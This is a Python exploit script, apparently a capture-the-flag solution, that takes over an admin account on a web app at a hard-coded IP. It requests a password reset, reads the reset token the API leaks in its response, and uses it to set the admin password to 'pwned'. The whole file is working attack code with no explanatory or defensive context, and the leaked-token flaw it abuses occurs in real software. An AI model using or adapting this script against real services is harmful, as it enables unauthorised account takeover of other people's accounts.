#!/usr/bin/python3
import requests
import json

email = "admin@stupid-reset.com"
password = "pwned"
proxy = {"http":"http://127.0.0.1:8080"}

# Step 1: Forget password to get the token
url = 'http://143.198.98.92:1337/api/forgot-password'
param = {'user':{'email':email}}
data = json.dumps(param)
headers = {"Content-Type":"application/json"}
res = requests.post(url, data=data, headers=headers)
val = json.loads(res.text)
reset_token = val['resettoken']

# Step 2: Reset the user accout password
change_to = "pwned"
param = {"user":{"password":change_to}}
data = json.dumps(param)
headers = {"Content-Type":"application/json"}
url = f'http://143.198.98.92:1337/api/reset/{reset_token}'
res = requests.post(url, data=data, headers=headers)

# Print success message
print(f'[*] Email: {email} password has been updated to "{change_to}"')
